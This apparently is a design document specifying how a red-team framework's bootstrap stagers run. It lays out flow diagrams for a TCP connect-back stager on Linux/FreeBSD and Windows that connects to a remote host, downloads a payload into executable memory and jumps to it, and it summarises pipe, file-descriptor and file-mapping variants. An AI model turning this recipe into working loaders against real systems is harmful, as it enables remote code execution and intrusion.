# SEQ-003: Bootstrap Stager Execution Sequences

## Status
Accepted

## Description

This sequence documents the runtime execution flow for each bootstrap stager channel type. Only the TCP connect-back variant is shown in full detail; other variants follow the same pattern with channel-specific setup.

## TCP Connect-Back Stager (Linux/FreeBSD)

```
Blob loaded at arbitrary address
         |
         v
[1] Entry: access config struct via __config_start
    Read: config.address_family (AF_INET or AF_INET6)
          config.remote_addr (4 or 16 bytes)
          config.remote_port (uint16, network byte order)
          config.length_size (4 or 8: bytes used for payload length prefix)
         |
         v
[2] Create socket:
    fd = socket(address_family, SOCK_STREAM, IPPROTO_TCP)
    -> raw_syscall(__NR_socket, ...)
         |
         +--- fd < 0? -> exit_group(1)
         |
         v
[3] Build sockaddr struct on stack:
    - AF_INET: sockaddr_in { family, port, addr }
    - AF_INET6: sockaddr_in6 { family, port, flowinfo, addr, scope }
    (All built from config struct fields)
         |
         v
[4] Connect:
    result = connect(fd, &sockaddr, sizeof(sockaddr))
    -> raw_syscall(__NR_connect, ...)
         |
         +--- result < 0? -> close(fd), exit_group(1)
         |
         v
[5] Read payload length:
    Read config.length_size bytes from socket into
    a stack variable (loop until all bytes received)
    Interpret as little-endian uint32 or uint64
         |
         v
[6] Allocate executable memory:
    buf = mmap(NULL, payload_length,
               PROT_READ|PROT_WRITE|PROT_EXEC,
               MAP_PRIVATE|MAP_ANONYMOUS, -1, 0)
         |
         +--- buf == MAP_FAILED? -> close(fd), exit_group(1)
         |
         v
[7] Read payload data:
    Loop: bytes_read = read(fd, buf + offset, remaining)
          offset += bytes_read
          remaining -= bytes_read
    Until: remaining == 0 or read returns 0 or error
         |
         +--- read error or premature EOF?
         |    -> close(fd), munmap(buf), exit_group(1)
         |
         v
[8] Close socket:
    close(fd)
         |
         v
[9] Flush instruction cache (if required by architecture)
         |
         v
[10] Indirect branch to buf
         |
         v
[RECEIVED PAYLOAD EXECUTES]
```

## TCP Connect-Back Stager (Windows)

```
Blob loaded at arbitrary address
         |
         v
[1] Access config struct, read connection parameters
         |
         v
[2] Resolve APIs via PEB walk:
    - WSAStartup, WSASocketA, connect, recv, closesocket (ws2_32.dll)
      Note: ws2_32.dll may not be loaded. Check PEB first.
      If not loaded: resolve LoadLibraryA from kernel32,
      call LoadLibraryA("ws2_32.dll"), then resolve socket APIs.
    - VirtualAlloc, ExitProcess (kernel32.dll)
    - FlushInstructionCache (kernel32.dll) [aarch64 only]
         |
         v
[3] Initialize Winsock:
    WSADATA wsa;
    WSAStartup(MAKEWORD(2, 2), &wsa)
         |
         v
[4] Create socket:
    sock = WSASocketA(address_family, SOCK_STREAM, IPPROTO_TCP,
                      NULL, 0, 0)
         |
         +--- sock == INVALID_SOCKET? -> ExitProcess(1)
         |
         v
[5] Build sockaddr on stack, call connect()
         |
         +--- connect fails? -> closesocket(sock), ExitProcess(1)
         |
         v
[6] Read payload length (recv loop)
         |
         v
[7] VirtualAlloc(NULL, length, MEM_COMMIT|MEM_RESERVE,
                 PAGE_EXECUTE_READWRITE)
         |
         +--- NULL? -> closesocket, ExitProcess(1)
         |
         v
[8] Read payload (recv loop into allocated memory)
         |
         v
[9] closesocket(sock)
         |
         v
[10] Flush icache (aarch64)
         |
         v
[11] Indirect branch to allocated memory
         |
         v
[RECEIVED PAYLOAD EXECUTES]
```

## Other Channel Variants (Summary)

### FD/Handle Read Stager
- Skips steps 2-4 (no socket creation or connection).
- Reads directly from config.fd (Linux/FreeBSD) or config.handle (Windows).
- Otherwise identical: read length, allocate, read payload, execute.

### Named Pipe Stager
- **Linux/FreeBSD**: Opens FIFO path via open() syscall, then reads like FD stager.
- **Windows**: Opens named pipe via CreateFileA (resolved by PEB walk), then reads via ReadFile.
- Pipe name string is in the config struct's variable-length region.

### Mmap/MapViewOfFile Stager
- **Linux/FreeBSD**: Opens file via open()/openat(), mmap's the specified region with PROT_READ, copies to RWX memory (or mmap with PROT_READ|PROT_EXEC if direct execution is acceptable), transfers execution.
- **Windows**: Opens file via CreateFileA, creates file mapping via CreateFileMappingA, maps view via MapViewOfFile, copies to RWX memory, executes.
- Config specifies: file path (variable-length string), offset within file, payload size.

## Derives From
- REQ-010
